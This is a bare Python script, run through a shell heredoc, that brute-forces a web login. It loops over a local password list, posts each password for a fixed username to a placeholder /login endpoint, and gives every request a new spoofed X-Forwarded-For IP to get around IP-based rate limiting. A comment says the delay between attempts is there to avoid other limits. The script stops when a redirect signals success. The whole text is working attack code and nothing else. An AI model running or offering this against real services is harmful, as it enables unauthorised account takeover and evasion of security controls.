python3 - <<'EOF'
import requests
import time

base_url = "URL"

with open("C:/Users/malik/Downloads/passwords.txt") as f:
    passwords = [line.strip() for line in f]

for i, password in enumerate(passwords):
    # Unique IP per request, simple increment
    fake_ip = f"192.168.{i // 256}.{i % 256}"
    
    r = requests.post(
        f"{base_url}/login",
        data={"username": "USERNAME", "password": password},
        headers={"X-Forwarded-For": fake_ip},
        allow_redirects=False
    )
    
    print(f"[{fake_ip}] {password} → {r.status_code}")
    
    if r.status_code == 302:
        print(f"\n[LOGIN SUCCESS] {password}")
        break
    
    time.sleep(0.3)  # small delay to avoid triggering other limits
EOF
